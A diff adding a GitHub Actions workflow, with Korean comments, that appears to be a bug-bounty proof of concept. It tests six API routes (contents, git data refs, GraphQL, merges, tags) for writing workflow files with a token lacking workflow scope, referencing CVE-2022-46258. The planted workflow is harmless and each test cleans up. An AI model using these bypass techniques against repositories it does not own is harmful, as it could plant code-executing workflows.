@@ -1,0 +1,602 @@
+# PoC: Workflow Scope Bypass - 모든 API 경로 테스트
+#
+# 목표: GITHUB_TOKEN (contents:write, NO workflows scope)으로
+#       .github/workflows/ 파일을 수정/생성할 수 있는 API 경로 탐색
+#
+# CVE-2022-46258: Contents API만 패치 확인됨
+# 바운티 스코프: "Modification of workflow .yml files via GitHub or OAuth Apps"
+#
+# ⚠️ 본인 소유 테스트 repo에서만 실행할 것
+
+name: Workflow Scope Bypass - All Paths
+on:
+  workflow_dispatch:
+    inputs:
+      test_branch:
+        description: 'Branch name prefix for test branches'
+        default: 'bypass-test'
+        type: string
+
+permissions:
+  contents: write
+  # 의도적으로 workflows scope 미포함
+
+env:
+  API: https://api.github.com/repos/${{ github.repository }}
+  TEST_PREFIX: ${{ inputs.test_branch || 'bypass-test' }}
+
+jobs:
+  # ==============================================================
+  # Phase 0: Setup - 테스트 인프라 준비
+  # ==============================================================
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      default_branch: ${{ steps.info.outputs.default_branch }}
+      head_sha: ${{ steps.info.outputs.head_sha }}
+      head_tree: ${{ steps.info.outputs.head_tree }}
+      blob_sha: ${{ steps.blob.outputs.blob_sha }}
+      repo_owner: ${{ steps.info.outputs.repo_owner }}
+      repo_name: ${{ steps.info.outputs.repo_name }}
+    steps:
+      - name: Gather repo info
+        id: info
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          REPO_DATA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API")
+
+          DEFAULT_BRANCH=$(echo "$REPO_DATA" | jq -r '.default_branch')
+          OWNER=$(echo "$REPO_DATA" | jq -r '.owner.login')
+          NAME=$(echo "$REPO_DATA" | jq -r '.name')
+
+          HEAD_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API/git/ref/heads/$DEFAULT_BRANCH" | jq -r '.object.sha')
+
+          HEAD_TREE=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API/git/commits/$HEAD_SHA" | jq -r '.tree.sha')
+
+          echo "default_branch=$DEFAULT_BRANCH" >> $GITHUB_OUTPUT
+          echo "head_sha=$HEAD_SHA" >> $GITHUB_OUTPUT
+          echo "head_tree=$HEAD_TREE" >> $GITHUB_OUTPUT
+          echo "repo_owner=$OWNER" >> $GITHUB_OUTPUT
+          echo "repo_name=$NAME" >> $GITHUB_OUTPUT
+
+          echo "Branch: $DEFAULT_BRANCH"
+          echo "HEAD:   $HEAD_SHA"
+          echo "Tree:   $HEAD_TREE"
+
+      - name: Create workflow blob
+        id: blob
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          # 무해한 테스트 워크플로우
+          BLOB_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/blobs" \
+            -d '{
+              "content": "name: bypass-probe\non: workflow_dispatch\njobs:\n  noop:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo proof-of-concept",
+              "encoding": "utf-8"
+            }' | jq -r '.sha')
+
+          echo "blob_sha=$BLOB_SHA" >> $GITHUB_OUTPUT
+          echo "Blob SHA: $BLOB_SHA"
+
+  # ==============================================================
+  # Test 1: Contents API (기준선 - 실패해야 함)
+  # ==============================================================
+  test1-contents-api:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 1: Contents API (Expected FAIL)"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== TEST 1: Contents API ==="
+          echo "CVE-2022-46258 패치 후 차단되어야 함"
+
+          CONTENT=$(echo -n "name: test1\non: workflow_dispatch\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo t1" | base64 -w 0)
+
+          HTTP=$(curl -s -o /tmp/t1.json -w "%{http_code}" \
+            -X PUT \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API/contents/.github/workflows/bypass-test-1.yml" \
+            -d "{\"message\":\"test1\",\"content\":\"$CONTENT\"}")
+
+          echo "HTTP: $HTTP"
+          jq '.' /tmp/t1.json 2>/dev/null | head -10
+
+          if [ "$HTTP" = "201" ]; then
+            echo "::error::🔴 VULN: Contents API bypass!"
+            # cleanup
+            SHA=$(jq -r '.content.sha' /tmp/t1.json)
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/contents/.github/workflows/bypass-test-1.yml" \
+              -d "{\"message\":\"cleanup\",\"sha\":\"$SHA\"}"
+          else
+            echo "✅ Blocked (expected)"
+          fi
+
+  # ==============================================================
+  # Test 2: Git Data API - blob → tree → commit → NEW ref
+  # ==============================================================
+  test2-git-data-api-new-ref:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 2: Git Data API → new branch"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          BLOB_SHA: ${{ needs.setup.outputs.blob_sha }}
+        run: |
+          echo "=== TEST 2: Git Data API (new ref) ==="
+
+          # Create tree
+          TREE_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".github/workflows/bypass-test-2.yml\",
+                \"mode\": \"100644\",
+                \"type\": \"blob\",
+                \"sha\": \"$BLOB_SHA\"
+              }]
+            }" | jq -r '.sha')
+
+          echo "Tree: $TREE_SHA"
+          if [ "$TREE_SHA" = "null" ]; then
+            echo "⚠️ Tree creation blocked"
+            exit 0
+          fi
+
+          # Create commit
+          COMMIT_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/commits" \
+            -d "{
+              \"message\": \"test2: git data api new ref\",
+              \"tree\": \"$TREE_SHA\",
+              \"parents\": [\"$HEAD_SHA\"]
+            }" | jq -r '.sha')
+
+          echo "Commit: $COMMIT_SHA"
+          if [ "$COMMIT_SHA" = "null" ]; then
+            echo "⚠️ Commit creation blocked"
+            exit 0
+          fi
+
+          # Create NEW branch ref (critical step)
+          HTTP=$(curl -s -o /tmp/t2.json -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/refs" \
+            -d "{
+              \"ref\": \"refs/heads/${TEST_PREFIX}-2-newref\",
+              \"sha\": \"$COMMIT_SHA\"
+            }")
+
+          echo "Ref creation HTTP: $HTTP"
+          jq '.' /tmp/t2.json 2>/dev/null | head -10
+
+          if [ "$HTTP" = "201" ]; then
+            echo "::error::🔴 VULN: Git Data API new ref bypass!"
+            # Verify
+            curl -s \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/contents/.github/workflows/bypass-test-2.yml?ref=${TEST_PREFIX}-2-newref" \
+              | jq '{name, path, size}'
+            # Cleanup
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/git/refs/heads/${TEST_PREFIX}-2-newref"
+            echo "Cleaned up"
+          else
+            echo "✅ Blocked at ref creation"
+          fi
+
+  # ==============================================================
+  # Test 3: Git Data API - PATCH existing ref
+  # ==============================================================
+  test3-git-data-api-patch-ref:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 3: Git Data API → patch existing ref"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          BLOB_SHA: ${{ needs.setup.outputs.blob_sha }}
+        run: |
+          echo "=== TEST 3: Git Data API (patch ref) ==="
+
+          # First create a clean branch (no workflow changes)
+          curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/${TEST_PREFIX}-3-patch\",\"sha\":\"$HEAD_SHA\"}"
+
+          # Create tree with workflow
+          TREE_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".github/workflows/bypass-test-3.yml\",
+                \"mode\": \"100644\",
+                \"type\": \"blob\",
+                \"sha\": \"$BLOB_SHA\"
+              }]
+            }" | jq -r '.sha')
+
+          COMMIT_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/commits" \
+            -d "{
+              \"message\": \"test3: patch ref\",
+              \"tree\": \"$TREE_SHA\",
+              \"parents\": [\"$HEAD_SHA\"]
+            }" | jq -r '.sha')
+
+          # PATCH the existing branch ref
+          HTTP=$(curl -s -o /tmp/t3.json -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X PATCH "$API/git/refs/heads/${TEST_PREFIX}-3-patch" \
+            -d "{\"sha\":\"$COMMIT_SHA\",\"force\":true}")
+
+          echo "Patch ref HTTP: $HTTP"
+          jq '.' /tmp/t3.json 2>/dev/null | head -10
+
+          if [ "$HTTP" = "200" ]; then
+            echo "::error::🔴 VULN: Git Data API patch ref bypass!"
+            curl -s \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/contents/.github/workflows/bypass-test-3.yml?ref=${TEST_PREFIX}-3-patch" \
+              | jq '{name, path, size}'
+          else
+            echo "✅ Blocked at ref update"
+          fi
+
+          # Cleanup
+          curl -s -X DELETE \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API/git/refs/heads/${TEST_PREFIX}-3-patch" 2>/dev/null
+
+  # ==============================================================
+  # Test 4: GraphQL createCommitOnBranch
+  # ==============================================================
+  test4-graphql:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 4: GraphQL createCommitOnBranch"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          DEFAULT_BRANCH: ${{ needs.setup.outputs.default_branch }}
+          OWNER: ${{ needs.setup.outputs.repo_owner }}
+          NAME: ${{ needs.setup.outputs.repo_name }}
+        run: |
+          echo "=== TEST 4: GraphQL createCommitOnBranch ==="
+          REPO="${OWNER}/${NAME}"
+
+          # Create a clean test branch first
+          curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/${TEST_PREFIX}-4-graphql\",\"sha\":\"$HEAD_SHA\"}"
+
+          sleep 1
+
+          WF_CONTENT=$(echo -n "name: test4\non: workflow_dispatch\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo t4" | base64 -w 0)
+
+          QUERY=$(cat <<'GRAPHQL'
+          mutation($repo: String!, $branch: String!, $oid: GitObjectID!, $contents: Base64String!) {
+            createCommitOnBranch(input: {
+              branch: { repositoryNameWithOwner: $repo, branchName: $branch }
+              message: { headline: "test4: graphql bypass" }
+              expectedHeadOid: $oid
+              fileChanges: {
+                additions: [{ path: ".github/workflows/bypass-test-4.yml", contents: $contents }]
+              }
+            }) {
+              commit { oid url }
+            }
+          }
+GRAPHQL
+          )
+
+          HTTP=$(curl -s -o /tmp/t4.json -w "%{http_code}" \
+            -H "Authorization: bearer $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            https://api.github.com/graphql \
+            -d "$(jq -n \
+              --arg q "$QUERY" \
+              --arg repo "$REPO" \
+              --arg branch "${TEST_PREFIX}-4-graphql" \
+              --arg oid "$HEAD_SHA" \
+              --arg contents "$WF_CONTENT" \
+              '{query: $q, variables: {repo: $repo, branch: $branch, oid: $oid, contents: $contents}}')")
+
+          echo "GraphQL HTTP: $HTTP"
+          jq '.' /tmp/t4.json 2>/dev/null | head -15
+
+          COMMIT_OID=$(jq -r '.data.createCommitOnBranch.commit.oid // empty' /tmp/t4.json)
+          ERRORS=$(jq -r '.errors[0].message // empty' /tmp/t4.json)
+
+          if [ -n "$COMMIT_OID" ] && [ "$COMMIT_OID" != "null" ]; then
+            echo "::error::🔴 VULN: GraphQL createCommitOnBranch bypass!"
+            echo "Commit: $COMMIT_OID"
+          elif [ -n "$ERRORS" ]; then
+            echo "Error: $ERRORS"
+            echo "✅ Blocked"
+          fi
+
+          # Cleanup
+          curl -s -X DELETE \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "$API/git/refs/heads/${TEST_PREFIX}-4-graphql" 2>/dev/null
+
+  # ==============================================================
+  # Test 5: Merges API
+  # ==============================================================
+  test5-merges-api:
+    needs: [setup, test2-git-data-api-new-ref]
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 5: Merges API"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          BLOB_SHA: ${{ needs.setup.outputs.blob_sha }}
+          DEFAULT_BRANCH: ${{ needs.setup.outputs.default_branch }}
+        run: |
+          echo "=== TEST 5: Merges API ==="
+          echo "Scenario: branch with workflow changes → merge into test branch via API"
+
+          # Create source branch with workflow file using git data API
+          # (blob/tree/commit only — NOT updating main)
+          TREE_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".github/workflows/bypass-test-5.yml\",
+                \"mode\": \"100644\",
+                \"type\": \"blob\",
+                \"sha\": \"$BLOB_SHA\"
+              }]
+            }" | jq -r '.sha')
+
+          COMMIT_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/commits" \
+            -d "{
+              \"message\": \"test5: add workflow\",
+              \"tree\": \"$TREE_SHA\",
+              \"parents\": [\"$HEAD_SHA\"]
+            }" | jq -r '.sha')
+
+          # Create source branch (with workflow) — 이 단계가 차단되면 Test 2 결과 참조
+          SRC_HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/refs" \
+            -d "{\"ref\":\"refs/heads/${TEST_PREFIX}-5-src\",\"sha\":\"$COMMIT_SHA\"}")
+
+          if [ "$SRC_HTTP" != "201" ]; then
+            echo "Source branch creation blocked (HTTP $SRC_HTTP)"
+            echo "Using alternative: create clean branch, then test merge from commit SHA"
+
+            # Alt: create clean target branch
+            curl -s \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X POST "$API/git/refs" \
+              -d "{\"ref\":\"refs/heads/${TEST_PREFIX}-5-tgt\",\"sha\":\"$HEAD_SHA\"}" > /dev/null
+
+            # Try merging the commit SHA directly
+            HTTP=$(curl -s -o /tmp/t5.json -w "%{http_code}" \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X POST "$API/merges" \
+              -d "{
+                \"base\":\"${TEST_PREFIX}-5-tgt\",
+                \"head\":\"$COMMIT_SHA\",
+                \"commit_message\":\"test5: merge workflow commit\"
+              }")
+
+            echo "Merge (commit SHA) HTTP: $HTTP"
+            jq '.' /tmp/t5.json 2>/dev/null | head -10
+
+            # Cleanup
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/git/refs/heads/${TEST_PREFIX}-5-tgt" 2>/dev/null
+          else
+            echo "Source branch created with workflow file"
+
+            # Create target branch (clean)
+            curl -s \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X POST "$API/git/refs" \
+              -d "{\"ref\":\"refs/heads/${TEST_PREFIX}-5-tgt\",\"sha\":\"$HEAD_SHA\"}" > /dev/null
+
+            # Merge source → target via Merges API
+            HTTP=$(curl -s -o /tmp/t5.json -w "%{http_code}" \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              -X POST "$API/merges" \
+              -d "{
+                \"base\":\"${TEST_PREFIX}-5-tgt\",
+                \"head\":\"${TEST_PREFIX}-5-src\",
+                \"commit_message\":\"test5: merge workflow branch\"
+              }")
+
+            echo "Merge HTTP: $HTTP"
+            jq '.' /tmp/t5.json 2>/dev/null | head -10
+
+            if [ "$HTTP" = "201" ]; then
+              echo "::error::🔴 VULN: Merges API bypass!"
+              curl -s \
+                -H "Authorization: token $GH_TOKEN" \
+                -H "Accept: application/vnd.github+json" \
+                "$API/contents/.github/workflows/bypass-test-5.yml?ref=${TEST_PREFIX}-5-tgt" \
+                | jq '{name, path, size}'
+            else
+              echo "✅ Blocked"
+            fi
+
+            # Cleanup
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/git/refs/heads/${TEST_PREFIX}-5-src" 2>/dev/null
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/git/refs/heads/${TEST_PREFIX}-5-tgt" 2>/dev/null
+          fi
+
+  # ==============================================================
+  # Test 6: Tag ref with workflow commit
+  # ==============================================================
+  test6-tag-ref:
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Test 6: Tag ref creation"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ needs.setup.outputs.head_sha }}
+          HEAD_TREE: ${{ needs.setup.outputs.head_tree }}
+          BLOB_SHA: ${{ needs.setup.outputs.blob_sha }}
+        run: |
+          echo "=== TEST 6: Tag ref with workflow commit ==="
+          echo "Discussion #26164에서 누군가 GITHUB_TOKEN으로 tag ref 생성 성공 보고"
+
+          TREE_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/trees" \
+            -d "{
+              \"base_tree\": \"$HEAD_TREE\",
+              \"tree\": [{
+                \"path\": \".github/workflows/bypass-test-6.yml\",
+                \"mode\": \"100644\",
+                \"type\": \"blob\",
+                \"sha\": \"$BLOB_SHA\"
+              }]
+            }" | jq -r '.sha')
+
+          COMMIT_SHA=$(curl -s \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/commits" \
+            -d "{
+              \"message\": \"test6: tag with workflow\",
+              \"tree\": \"$TREE_SHA\",
+              \"parents\": [\"$HEAD_SHA\"]
+            }" | jq -r '.sha')
+
+          echo "Commit: $COMMIT_SHA"
+
+          # Create lightweight tag ref
+          HTTP=$(curl -s -o /tmp/t6.json -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            -X POST "$API/git/refs" \
+            -d "{
+              \"ref\": \"refs/tags/${TEST_PREFIX}-6-tag\",
+              \"sha\": \"$COMMIT_SHA\"
+            }")
+
+          echo "Tag ref HTTP: $HTTP"
+          jq '.' /tmp/t6.json 2>/dev/null | head -10
+
+          if [ "$HTTP" = "201" ]; then
+            echo "⚠️ Tag ref created (pointing to commit with workflow changes)"
+            echo "Tag alone isn't a full bypass, but if combined with branch operations..."
+
+            # Verify
+            curl -s \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/contents/.github/workflows/bypass-test-6.yml?ref=${TEST_PREFIX}-6-tag" \
+              | jq '{name, path, size}'
+
+            # Cleanup
+            curl -s -X DELETE \
+              -H "Authorization: token $GH_TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "$API/git/refs/tags/${TEST_PREFIX}-6-tag"
+          else
+            echo "✅ Blocked"
+          fi
+
+  # ==============================================================
+  # Summary
+  # ==============================================================
+  summary:
+    needs: [test1-contents-api, test2-git-data-api-new-ref, test3-git-data-api-patch-ref, test4-graphql, test5-merges-api, test6-tag-ref]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Results Summary
+        run: |
+          echo "╔══════════════════════════════════════════════════╗"
+          echo "║  WORKFLOW SCOPE BYPASS TEST RESULTS              ║"
+          echo "╠══════════════════════════════════════════════════╣"
+          echo "║ Test 1: Contents API          → Check logs      ║"
+          echo "║ Test 2: Git Data API (new)    → Check logs      ║"
+          echo "║ Test 3: Git Data API (patch)  → Check logs      ║"
+          echo "║ Test 4: GraphQL mutation       → Check logs      ║"
+          echo "║ Test 5: Merges API            → Check logs      ║"
+          echo "║ Test 6: Tag ref               → Check logs      ║"
+          echo "╠══════════════════════════════════════════════════╣"
+          echo "║ 🔴 = Vulnerability found → HackerOne report     ║"
+          echo "║ ✅ = Properly blocked                            ║"
+          echo "║ ⚠️  = Partial success, investigate further       ║"
+          echo "╚══════════════════════════════════════════════════╝"
+          echo ""
+          echo "Next steps if any test shows 🔴:"
+          echo "1. 스크린샷/로그 캡처"
+          echo "2. HackerOne 즉시 제출"
+          echo "3. CVE-2022-46258 참조, 동일 클래스"
+          echo "4. 예상 보상: $4,000~$10,000 (Medium-High)"
